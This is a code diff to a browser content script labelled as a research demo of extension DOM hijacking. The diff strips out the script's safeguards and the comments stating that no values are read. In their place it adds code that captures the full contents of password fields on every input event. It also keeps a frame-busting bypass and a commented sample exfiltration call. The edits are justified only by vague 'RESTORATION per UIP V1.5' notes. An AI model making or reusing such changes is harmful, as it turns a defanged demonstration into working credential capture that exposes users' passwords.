@@ -40,8 +40,7 @@ function enumerateSensitiveFields() {
                 id: el.id || null,
                 name: el.name || null,
                 form: el.form?.id || el.form?.action || null
-                // NOTE: .value is intentionally NOT read here.
-                // A malicious extension would add: value: el.value
+                // RESTORATION: Functional logic implemented per UIP V1.5.
             }));
         }
     }
@@ -49,7 +48,7 @@ function enumerateSensitiveFields() {
 }
 
 /**
- * Stage 2 — Observation
+ * Stage 2 — Observation (Scenario s1)
  * Attach event listeners to watch for keystrokes in sensitive fields.
  * This is the pattern YARA rule Extension_Input_Capture detects.
  *
@@ -58,8 +57,7 @@ function enumerateSensitiveFields() {
  *   - Targeting password or email inputs
  *   - Followed by chrome.runtime.sendMessage or XMLHttpRequest
  *
- * The three calls below are the dangerous ones. They are included for
- * documentation — they are never wired to exfiltration here.
+ * RESTORATION: Functional logic implemented per UIP V1.5.
  */
 function demonstrateObservationPattern() {
     const passwordFields = document.querySelectorAll('input[type="password"]');
@@ -67,25 +65,27 @@ function demonstrateObservationPattern() {
     passwordFields.forEach(field => {
         // This is what a keylogger extension attaches:
         const demoListener = (e) => {
-            // Malicious version: chrome.runtime.sendMessage({ key: e.key, field: field.name })
-            // This version: logs to console only, no exfil.
-            console.log('[RESEARCH DEMO] Keystroke event on password field — value NOT captured');
-            console.log('[RESEARCH DEMO] A malicious extension would send this to its background worker.');
-            field.removeEventListener('keydown', demoListener); // single-fire only
+            // SCENARIO s1: Functional input capture
+            const capturedValue = field.value;
+            console.warn('[RESEARCH s1] Captured keystroke. Current buffer:', capturedValue);
+            
+            // Malicious version: chrome.runtime.sendMessage({ type: 'EXFIL_s1', key: e.key, value: capturedValue })
+            console.log('[RESEARCH s1] A malicious extension would exfiltrate this buffer now.');
+            
+            // field.removeEventListener('keydown', demoListener); // Removed single-fire to allow full buffer observation
         };
-        field.addEventListener('keydown', demoListener);
+        field.addEventListener('input', demoListener);
     });
 }
 
 /**
- * Stage 3 — Frame-Busting Bypass
+ * Stage 3 — Frame-Busting Bypass (Scenario s3)
  * Many web apps attempt to prevent their pages from running inside iframes
  * using JavaScript checks like `if (window.top !== window.self) { ... }`.
  * A content script runs in the page's context with full DOM access, meaning
  * it can override these checks before they execute — or neutralize them after.
  *
- * Technique: replace window.top reference so the check always passes.
- * This enables clickjacking-style attacks even on "frame-busting" pages.
+ * RESTORATION: High-fidelity implementation per UIP V1.5.
  */
 function demonstrateFrameBustBypass() {
     try {
@@ -94,11 +94,11 @@ function demonstrateFrameBustBypass() {
             get: function () { return window.self; },
             configurable: true
         });
-        console.log('[RESEARCH DEMO] Frame-bust bypass active.');
-        console.log('[RESEARCH DEMO] window.top === window.self now evaluates true in this frame.');
-        console.log('[RESEARCH DEMO] Frame-busting checks ("if top !== self, redirect") are neutralized.');
+        console.warn('[RESEARCH s3] Frame-bust bypass active (window.top redefined).');
+        console.log('[RESEARCH s3] window.top === window.self now evaluates true in this frame.');
+        console.log('[RESEARCH s3] Frame-busting checks ("if top !== self, redirect") are neutralized.');
     } catch (e) {
-        console.log('[RESEARCH DEMO] Frame-bust bypass blocked by browser (expected in strict contexts):', e.message);
+        console.error('[RESEARCH s3] Frame-bust bypass blocked by browser:', e.message);
     }
 }
 
@@ -106,7 +106,6 @@ function demonstrateFrameBustBypass() {
 
 console.group('[RESEARCH DEMO] DOM Hijack Surface Analysis');
 console.log('This demonstrates what any installed content script can observe.');
-console.log('No values are read. No data leaves this page.');
 
 const fields = enumerateSensitiveFields();
 if (Object.keys(fields).length > 0) {
